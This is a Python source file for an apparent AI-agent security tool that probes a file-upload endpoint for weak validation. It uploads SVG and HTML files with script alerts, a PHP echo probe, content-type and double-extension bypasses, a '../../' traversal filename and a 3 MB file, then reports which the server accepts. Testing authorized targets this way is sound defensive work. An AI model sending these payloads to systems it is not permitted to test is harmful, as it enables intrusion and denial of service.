"""Test a file-upload endpoint for weak validation (leak / RCE / DoS).

Vibe upload endpoints trust the client: accept ``.svg``/``.html`` (stored XSS),
``.php`` (RCE), bypass a content-type check with a fake image type or a double
extension, honour a traversal filename, and take unbounded/oversized files
(availability). This uploads each and flags what the server accepts.
"""

from __future__ import annotations

import asyncio
import json
from typing import Any

from agents import RunContextWrapper, function_tool

from strix.tools.http_replay.tools import _replay_impl


_BOUNDARY = "----strixUPLOAD7f3a1c9e"
_SVG = '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>alert(1)</script></svg>'
_HTML = "<html><script>alert(document.domain)</script></html>"
_PHP = "<?php echo 'strix-rce-'.(7*7); ?>"

# (name, filename, content_type, content, risk).
_UPLOADS: tuple[tuple[str, str, str, str, str], ...] = (
    ("svg_xss", "strix.svg", "image/svg+xml", _SVG, "stored XSS (SVG served inline)"),
    ("html_xss", "strix.html", "text/html", _HTML, "stored XSS (HTML rendered)"),
    ("php_rce", "strix.php", "application/x-php", _PHP, "code execution if served by PHP"),
    ("ctype_bypass", "strix.php", "image/png", _PHP, "content-type check bypassed"),
    ("double_ext", "strix.php.png", "image/png", _PHP, "double-extension bypass"),
    (
        "traversal_name",
        "../../strixup.txt",
        "text/plain",
        "strixtraversal",
        "path traversal in name",
    ),
    ("oversized", "big.txt", "text/plain", "A" * 3_000_000, "no size limit (resource exhaustion)"),
)


def _multipart(field: str, filename: str, ctype: str, content: str) -> str:
    return (
        f"--{_BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="{field}"; filename="{filename}"\r\n'
        f"Content-Type: {ctype}\r\n\r\n"
        f"{content}\r\n"
        f"--{_BOUNDARY}--\r\n"
    )


def _accepted(resp: dict[str, Any]) -> bool:
    status = resp.get("status_code")
    return isinstance(status, int) and 200 <= status < 300


def _upload_probe_impl(
    url: str,
    file_field: str,
    method: str,
    headers: dict[str, str] | None,
    timeout: int,
) -> dict[str, Any]:
    if not url or not url.strip():
        return {"success": False, "error": "url cannot be empty"}
    findings: list[dict[str, Any]] = []
    results: list[dict[str, Any]] = []
    for name, filename, ctype, content, risk in _UPLOADS:
        body = _multipart(file_field, filename, ctype, content)
        req_headers = {
            **(headers or {}),
            "Content-Type": f"multipart/form-data; boundary={_BOUNDARY}",
        }
        resp = _replay_impl(method, url, req_headers, body, timeout, allow_redirects=False)
        if not resp.get("success"):
            results.append({"test": name, "error": resp.get("error")})
            continue
        accepted = _accepted(resp)
        resp_body = resp.get("body") or ""
        # A returned path/URL echoing our filename means it was stored.
        stored_ref = filename.split("/")[-1] in resp_body
        entry = {
            "test": name,
            "status": resp.get("status_code"),
            "accepted": accepted,
            "stored_reference": stored_ref,
            "risk": risk,
        }
        results.append(entry)
        if accepted:
            findings.append(entry)
    return {
        "success": True,
        "url": url,
        "possible_upload_flaw": bool(findings),
        "accepted_uploads": [f["test"] for f in findings],
        "results": results,
    }


@function_tool(timeout=180, strict_mode=False)
async def upload_probe(
    ctx: RunContextWrapper,
    url: str,
    file_field: str = "file",
    method: str = "POST",
    headers: dict[str, str] | None = None,
    timeout: int = 20,
) -> str:
    """Test a file-upload endpoint for weak validation.

    Uploads a set of malicious files — SVG/HTML (stored XSS), PHP (RCE), a
    content-type-mismatched PHP, a double-extension file, a path-traversal
    filename, and an oversized file (DoS) — and flags which the server accepts.
    If the response echoes the stored path, fetch it to confirm it's served with
    the dangerous type. Only test authorized targets.

    Returns JSON with ``accepted_uploads`` (by risk) and ``possible_upload_flaw``.

    Args:
        url: The upload endpoint.
        file_field: The multipart field name for the file (default ``file``).
        method: HTTP method (default POST).
        headers: Request headers (e.g. the user's session).
        timeout: Per-request timeout in seconds (default 20).
    """
    del ctx
    return json.dumps(
        await asyncio.to_thread(_upload_probe_impl, url, file_field, method, headers, timeout),
        ensure_ascii=False,
        default=str,
    )
